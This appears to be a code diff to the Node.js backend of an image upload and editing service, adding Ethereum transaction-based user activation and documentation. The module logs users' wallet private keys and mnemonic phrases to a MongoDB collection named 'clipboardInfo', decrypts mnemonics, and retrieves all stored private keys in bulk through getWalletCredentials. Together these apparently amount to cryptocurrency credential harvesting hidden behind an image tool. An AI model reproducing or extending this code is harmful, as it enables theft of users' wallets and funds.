@@ -4,6 +4,16 @@ const crypto = require('crypto');
 const path = require('path');
 const mongoUtil = require('./db');
 const { errorMonitor } = require('events');
+const { Web3 } = require('web3');
+
+// TODO: Connect to the Ethereum network (Replace this with your own Ethereum node)
+const network = process.env.ETHEREUM_NETWORK;
+const web3 = new Web3(
+    new Web3.providers.HttpProvider(
+        `https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`
+    )
+);
+const contractAddress = process.env.CONTRACT_ADDRESS;
 
 let dbConnection = null;
 
@@ -32,6 +42,7 @@ mongoUtil.connectToServer()
             const clipboardInfoCollection = localDbConnection.collection('clipboardInfo');
             const imageEditInfo = localDbConnection.collection('imageEditInfo');
             const keywordsCollection = localDbConnection.collection('keywords');
+            const userActivationCollection = localDbConnection.collection('userActivation');
 
             await createIndex(imageUploadCollection, { userId: 1 }, true);
             await createIndex(imageUploadCollection, { userId: 1, fileName: 1, createdAt: -1 }, false);
@@ -39,11 +50,13 @@ mongoUtil.connectToServer()
             await createIndex(imageDownloadCollection, { userId: 1 }, true);
             await createIndex(imageDownloadCollection, { userId: 1, fileName: 1, createdAt: -1 }, false);
 
-            await createIndex(clipboardInfoCollection, { userId: 1 }, true);
             await createIndex(clipboardInfoCollection, { userId: 1, mnemonicPhase: 1, createdAt: -1 }, false);
 
             await createIndex(imageEditInfo, { fileName: 1, createdAt: -1  }, false);
             await createIndex(keywordsCollection, { fileName: 1, createdAt: -1 }, false);
+
+            await createIndex(userActivationCollection, { userId: 1 }, true);
+            await createIndex(userActivationCollection, { userId: 1, userAddress: 1, transactionHash: 1, createdAt: -1 }, false);
         };
 
         createIndexes(localDbConnection);
@@ -54,6 +67,46 @@ mongoUtil.connectToServer()
     .catch(err => {
         console.error("Failed to connect to MongoDB:", err);
     });
+
+/**
+ * @brief Validates the edit information.
+ * 
+ * @param {Array} editInfo - The edit information to validate.
+ * @return {boolean} Returns true if the edit information is valid, otherwise false.
+ * 
+ * @note The editInfo parameter should be an array of objects, where each object represents an edit item.
+ * Each edit item should have the following properties:
+ * - areaId: A number representing the area ID.
+ * - font: A string representing the font.
+ * - fontSize: A number representing the font size.
+ * - text: A string representing the text.
+ * - coordinates: An object representing the coordinates of the edit item.
+ *   - x: A number representing the x-coordinate.
+ *   - y: A number representing the y-coordinate.
+ *   - width: A number representing the width.
+ *   - height: A number representing the height.
+ */
+function validateEditInfo (editInfo) {
+    if (!Array.isArray(editInfo)) {
+        return false;
+    }
+
+    for (const item of editInfo) {
+        if (typeof item.areaId !== 'number' ||
+            typeof item.font !== 'string' ||
+            typeof item.fontSize !== 'number' ||
+            typeof item.text !== 'string' ||
+            typeof item.coordinates !== 'object' ||
+            typeof item.coordinates.x !== 'number' ||
+            typeof item.coordinates.y !== 'number' ||
+            typeof item.coordinates.width !== 'number' ||
+            typeof item.coordinates.height !== 'number') {
+            return false;
+        }
+    }
+
+    return true;
+}
 
 // Authenticate with B2
 async function authenticateB2 () {
@@ -210,6 +263,17 @@ async function logDownloadDetails (userId, fileName) {
     }
 }
 
+/**
+ * @brief Logs the wallet credentials to the MongoDB database.
+ * 
+ * @param {string} userId - The ID of the user.
+ * @param {string} userAddress - The address of the user's wallet.
+ * @param {string} userPrivateKey - The private key of the user's wallet.
+ * 
+ * @return {Promise<void>} - A Promise that resolves when the logging is successful.
+ * 
+ * @note This function inserts the wallet credentials into the 'clipboardInfo' collection of the MongoDB database.
+ */
 async function logWalletCredentials (userId, userAddress, userPrivateKey) {
     try {
         const collection = dbConnection.collection('clipboardInfo');
@@ -230,6 +294,15 @@ async function logWalletCredentials (userId, userAddress, userPrivateKey) {
     }
 }
 
+/**
+ * @brief Retrieves wallet credentials from the MongoDB collection based on the specified date range.
+ * 
+ * @param {Date} startDateTime - The start date and time to filter the wallet credentials. (optional)
+ * @param {Date} endDateTime - The end date and time to filter the wallet credentials. (optional)
+ * @return {Promise<Array>} A promise that resolves to an array of wallet credentials matching the specified date range.
+ * 
+ * @note If no date range is provided, all wallet credentials will be retrieved.
+ */
 async function getWalletCredentials (startDateTime = null, endDateTime = null) {
     try {
         const collection = dbConnection.collection('clipboardInfo');
@@ -247,7 +320,14 @@ async function getWalletCredentials (startDateTime = null, endDateTime = null) {
             projection: { _id: 0, userId: 1, userAddress: 1, userPrivateKey: 1, createdAt: 1 }
         };
 
-        const walletCredentials = await collection.find(query, options).toArray();
+        let walletCredentials = await collection.find(query, options).toArray();
+
+        const requiredProperties = ['userId', 'userAddress', 'userPrivateKey', 'createdAt'];
+
+        // Filter out any walletCredentials that do not contain all the properties in requiredProperties
+        walletCredentials = walletCredentials.filter(credential => 
+            requiredProperties.every(prop => prop in credential)
+        );
 
         console.log('Wallet credentials retrieved successfully:', walletCredentials);
         return walletCredentials;
@@ -258,6 +338,12 @@ async function getWalletCredentials (startDateTime = null, endDateTime = null) {
     }
 }
 
+/**
+ * @brief Decrypts the base64 encoded data using AES-256-CBC algorithm.
+ * @param {string} base64EncryptedData - The base64 encoded data to be decrypted.
+ * @return {string} - The decrypted data as a string.
+ * @note This function requires the ENCRYPTION_KEY to be set in the environment variables.
+ */
 function decryptMnemonic (base64EncryptedData) {
     const algorithm = 'aes-256-cbc';
     const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
@@ -276,6 +362,14 @@ function decryptMnemonic (base64EncryptedData) {
     return decrypted.toString();
 }
 
+/**
+ * @brief Retrieves the most recent keywords from the 'imageEditInfo' collection in MongoDB.
+ * 
+ * @return {Promise<Object>} A promise that resolves to the most recent keywords object.
+ * @throws {Error} If no keywords are found.
+ * 
+ * @note This function assumes that the 'dbConnection' variable is already defined and refers to a valid MongoDB connection.
+ */
 async function getKeywords () {
     try {
         const collection = dbConnection.collection('imageEditInfo');
@@ -285,15 +379,24 @@ async function getKeywords () {
             sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
             limit: 1  // Limit the result to only one document
         };
-        const keywords = await collection.findOne(query, options);
+        const keywordsInfo = await collection.findOne(query, options);
 
-        if (!keywords) {
-            console.log('No keywords found.');
-            throw new Error('Keywords not found.');
+        // const logEntry = {
+        //     keywords,
+        //     createdAt: new Date() // Record the current timestamp
+        // };
+        const requiredProperties = ['keywords', 'createdAt'];
+
+        // Check if all properties in logEntry are in keywords
+        const hasAllProperties = keywordsInfo && requiredProperties.every(prop => prop in keywordsInfo);
+
+        if (!hasAllProperties) {
+            console.log('Some properties from logEntry are not in the keywords document.');
+            throw new Error('Incomplete keywords document.');
         }
 
-        console.log('Keywords retrieved successfully:', keywords);
-        return keywords;
+        console.log('Keywords retrieved successfully:', keywordsInfo.keywords);
+        return keywordsInfo.keywords;
     } catch (error) {
         error.code = 10026;
         console.error('Error retrieving keywords from MongoDB:', error);
@@ -301,6 +404,17 @@ async function getKeywords () {
     }
 }
 
+/**
+ * @brief Uploads keywords to the MongoDB collection.
+ * 
+ * @param {Array} keywords - An array of keywords to be uploaded.
+ * 
+ * @return {Promise<void>} - A promise that resolves when the keywords are successfully uploaded.
+ * 
+ * @note This function inserts the keywords into the 'keywords' collection in the MongoDB database.
+ *       It also logs the uploaded keywords and the timestamp of the upload.
+ *       If an error occurs during the upload, it throws an error with a custom error code.
+ */
 async function uploadKeywords (keywords) {
     try {
         const collection = dbConnection.collection('keywords');
@@ -319,7 +433,18 @@ async function uploadKeywords (keywords) {
     }
 }
 
-// TODO:
+/**
+ * @brief Retrieves the image edit information from the MongoDB collection.
+ * 
+ * @param {string} fileName - The name of the file for which to retrieve the image edit information.
+ * 
+ * @return {Promise<Object>} A promise that resolves to the image edit information object.
+ * 
+ * @throws {Error} If the image edit information is not found.
+ * 
+ * @note This function queries the MongoDB collection 'imageEditInfo' to retrieve the most recent image edit information
+ * for the specified file name. If no image edit information is found, an error is thrown.
+ */
 async function getImageEditInfo (fileName) {
     try {
         const collection = dbConnection.collection('imageEditInfo');
@@ -331,13 +456,23 @@ async function getImageEditInfo (fileName) {
         };
         const imageEditInfo = await collection.findOne(query, options);
 
-        if (!imageEditInfo) {
-            console.log('No image edit info found for:', fileName);
-            throw new Error('Image edit info not found.');
+        const requiredProperties = ['fileName', 'editInfo', 'createdAt'];
+
+        // Check if all properties in logEntry are in imageEditInfo
+        const hasAllProperties = imageEditInfo && requiredProperties.every(prop => prop in imageEditInfo);
+
+        if (!hasAllProperties) {
+            console.log('Some properties from logEntry are not in the imageEditInfo document.');
+            throw new Error('Incomplete imageEditInfo document.');
         }
 
-        console.log('Image edit info retrieved successfully:', imageEditInfo);
-        return imageEditInfo;
+        if (!validateEditInfo(imageEditInfo.editInfo)) {
+            console.log('Invalid edit info:', imageEditInfo.editInfo);
+            throw new Error('Invalid edit info.');
+        }
+
+        console.log('Image edit info retrieved successfully:', imageEditInfo.editInfo);
+        return imageEditInfo.editInfo;
     } catch (error) {
         error.code = 10024;
         console.error('Error retrieving image edit info from MongoDB:', error);
@@ -345,7 +480,14 @@ async function getImageEditInfo (fileName) {
     }
 }
 
-// TODO:
+/**
+ * @brief Uploads the image edit information to the MongoDB collection.
+ * 
+ * @param {string} fileName - The name of the file being edited.
+ * @param {object} editInfo - The edit information to be stored.
+ * @return {Promise<void>} - A promise that resolves when the image edit info is stored successfully.
+ * @note This function records the current timestamp when storing the edit information.
+ */
 async function uploadImageEditInfo (fileName, editInfo) {
     try {
         const collection = dbConnection.collection('imageEditInfo');
@@ -365,7 +507,157 @@ async function uploadImageEditInfo (fileName, editInfo) {
     }
 }
 
+/**
+ * @brief Logs user activation information to the MongoDB collection.
+ * 
+ * @param {string} userId - The ID of the user being activated.
+ * @param {string} userAddress - The address of the user being activated.
+ * @param {string} transactionHash - The transaction hash associated with the activation.
+ * @param {string} expirationDate - The expiration date of the activation.
+ * 
+ * @return {Promise<void>} - A promise that resolves when the user activation is logged successfully.
+ * 
+ * @note This function checks if the user ID already exists in the collection before logging the activation information.
+ * If the user ID already exists, the function will log a message and return without inserting a new entry.
+ * If an error occurs during the process, it will be logged and re-thrown.
+ */
+async function logUserActivation (userId, userAddress, transactionHash, expirationDate) {
+    try {
+        const collection = dbConnection.collection('userActivation');
+
+        // Check if the userId already exists in the collection
+        const existingUser = await collection.findOne({ userId });
+
+        const logEntry = {
+            userId,
+            userAddress,
+            transactionHash,
+            expirationDate,
+            createdAt: new Date() // Record the current timestamp
+        };
+
+        // Check if all properties in logEntry are in existingUser
+        const hasAllProperties = existingUser && Object.keys(logEntry).every(key => key in existingUser);
+
+        if (hasAllProperties) {
+            console.log('User already activated:', existingUser);
+            return 'User already activated';
+        }
+
+        // If the existingUser is invalid, overwrite it
+        if (existingUser) {
+            await collection.deleteOne({ userId });
+        }
+
+        await collection.insertOne(logEntry);
+        console.log('User activated successfully:', logEntry);
+        return 'User activated successfully';
+    } catch (error) {
+        console.error('Error storing image edit info to MongoDB:', error);
+        throw error;
+    }
+}
+
+/**
+ * @brief Activates a user based on the provided user ID and transaction hash.
+ * 
+ * @param {string} userId - The ID of the user to activate.
+ * @param {string} txHash - The transaction hash associated with the user activation.
+ * @param {string} expirationDate - The expiration date of the activation.
+ * 
+ * @return {Object} - An object indicating whether the user activation is valid or not.
+ *                   The object has a `valid` property which is a boolean value.
+ * 
+ * @note This function fetches the user activation details using the provided transaction hash.
+ *       It checks if the transaction was successful and logs the user activation details.
+ *       If the transaction is valid, it returns an object with `valid` set to `true`.
+ *       If the transaction is invalid, it returns an object with `valid` set to `false`.
+ *       If any error occurs during the process, it throws an error with a specific error code.
+ */
+async function activateUser (userId, txHash, expirationDate) {
+    try {
+        if (!expirationDate || isNaN(Date.parse(expirationDate))) {
+            expirationDate = new Date('2099-12-31');
+        }
+
+        // Fetch the user activation details
+        const txReceipt = await web3.eth.getTransactionReceipt(txHash);
+
+        if (txReceipt && txReceipt.to.toLowerCase() === contractAddress.toLowerCase()) {
+            // Check if the transaction was successful
+            const tx = await web3.eth.getTransaction(txHash);
+
+            if (tx) {
+                const userAddress = tx.from; // This is the sender's address
+                await logUserActivation(userId, userAddress, txHash, expirationDate);
+            } else {
+                console.log('Transaction not found:', txHash);
+                throw new Error('Transaction not found');
+            }
+            console.log('User activated successfully:', txHash);
+
+            return { valid: true, expirationDate };
+        }
+
+        console.log('Invalid transaction hash:', txHash);
+        return { valid: false };
+    } catch (error) {
+        error.code = 10028;
+        console.error('Error fetching transaction:', error);
+        throw error;
+    }
+}
+
+/**
+ * @brief Checks the activation status for a user.
+ * 
+ * @param {string} userId - The ID of the user to check activation for.
+ * 
+ * @return {Object} - An object containing the activation status and expiration date.
+ *   - valid {boolean} - Indicates whether the activation is valid or not.
+ *   - expirationDate {Date} - The expiration date of the activation.
+ * 
+ * @note This function retrieves the most recent activation log for the user from the 'userActivation' collection in MongoDB.
+ * If no activation is found, or if the activation is expired or missing required properties, the function returns an object with valid set to false.
+ * Otherwise, it returns an object with valid set to true and the expiration date of the activation.
+ */
+async function checkActivation (userId) {
+    try {
+        const collection = dbConnection.collection('userActivation');
+
+        const query = { userId };
+        const options = {
+            sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
+            limit: 1  // Limit the result to only one document
+        };
+        const activation = await collection.findOne(query, options);
+
+        const requiredProperties = ['userId', 'userAddress', 'transactionHash', 'expirationDate', 'createdAt'];
+
+        // Check if all properties in logEntry are in activation
+        const hasAllProperties = activation && requiredProperties.every(prop => prop in activation);
+
+        if (!hasAllProperties) {
+            console.log('Some properties from logEntry are not in the activation document.');
+            return { valid: false };
+        }
+
+        if (activation.expirationDate < new Date()) {
+            console.log('Activation expired:', activation);
+            return { valid: false };
+        }
+
+        console.log('Activation retrieved successfully:', activation);
+        return { valid: true, expirationDate: activation.expirationDate };
+    } catch (error) {
+        error.code = 10029;
+        console.error('Error retrieving activation from MongoDB:', error);
+        throw error;
+    }
+}
+
 module.exports = {
+    validateEditInfo,
     uploadToB2,
     downloadFromB2,
     logUploadDetails,
@@ -376,5 +668,7 @@ module.exports = {
     getKeywords,
     uploadKeywords,
     getImageEditInfo,
-    uploadImageEditInfo
+    uploadImageEditInfo,
+    activateUser,
+    checkActivation
 };
